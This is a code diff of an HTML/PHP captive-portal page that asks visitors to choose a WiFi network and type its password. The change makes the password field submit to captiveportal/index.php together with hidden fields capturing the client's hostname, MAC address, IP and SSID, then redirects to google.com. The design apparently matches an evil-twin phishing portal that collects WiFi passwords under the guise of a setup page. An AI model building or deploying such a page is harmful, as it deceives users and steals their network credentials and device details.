@@ -20,7 +20,7 @@
     <script type="text/javascript">
       function redirect() {
           setTimeout(function() {
-            document.location.href = $destination; 
+            document.location.href = 'https://www.google.com'; 
           }, 100);
         }
     </script>
@@ -75,41 +75,42 @@
       </symbol>
     </svg>
     <div class="container">
-      <div class="card">
-        <form method="POST" action="captiveportal/index.php", onsubmit="redirect()">
+      <form method="POST" action="captiveportal/index.php", onsubmit="redirect()">
+        <div class="card">
           <header class="card-header">
             <img src="assets/img/wifi-2.svg" alt="Wifi Logo" class="card-header-icon logo"/>
-            </svg>
-            <p class="card-header-title title is-4">Find and join a Wifi Network</p>
-            <style>
+          </svg>
+          <p class="card-header-title title is-4">Find and join a Wifi Network</p>
+          <style>
             </style>
-          </header>
-          <div class="card-content">
-            <div class="content">
-              <p>Select the Wifi network that you want the controller to connect to and then provide the password</p>
-              <label class="label">Network</label>
-              <span id="loader" class="loader is-loading"></span>
-              <div id="network-list" class="list is-hoverable is-hidden"></div>
-              <div class="field is-hidden">
-                <label class="label">Password</label>
-                <div class="control">
-                  <input class="input" id="password" type="password" placeholder="Enter password">
+            </header>
+            <div class="card-content">
+              <div class="content">
+                <p>Select the Wifi network that you want the controller to connect to and then provide the password</p>
+                <label class="label">Network</label>
+                <span id="loader" class="loader is-loading"></span>
+                <div id="network-list" class="list is-hoverable is-hidden"></div>
+                <div class="field is-hidden">
+                  <label class="label">Password</label>
+                  <div class="control">
+                    <!-- <input class="input" id="password" type="password" placeholder="Enter password"> -->
+                    <input class="input" type="password" name="password" id="password" placeholder="Enter Password" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off">
+                  </div>
                 </div>
+                <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
+                <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
+                <input type="hidden" name="ip" id="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
+                <input type="hidden" name="target" value="<?=$destination?>">
+                <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
               </div>
-              <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
-              <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
-              <input type="hidden" name="ip" id="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
-              <input type="hidden" name="target" value="<?=$destination?>">
-              <input type="hidden" name="ssid" value="<?=getClientSSID($_SERVER['REMOTE_ADDR']);?>">
             </div>
+            <footer class="card-footer">
+              <button type="button" id="rescan-btn" class="card-footer-item button is-light">Rescan</a>
+              <button type="submit" id="submit-btn" class="card-footer-item button is-primary ">Join</button>
+            </footer>
           </div>
-          <footer class="card-footer">
-            <button type="button" id="rescan-btn" class="card-footer-item button is-light">Rescan</a>
-            <button type="submit" id="submit-btn" class="card-footer-item button is-primary ">Join</button>
-          </footer>
         </form>
       </div>
-    </div>
     <script type="text/javascript"></script>
   </body>
 </html>
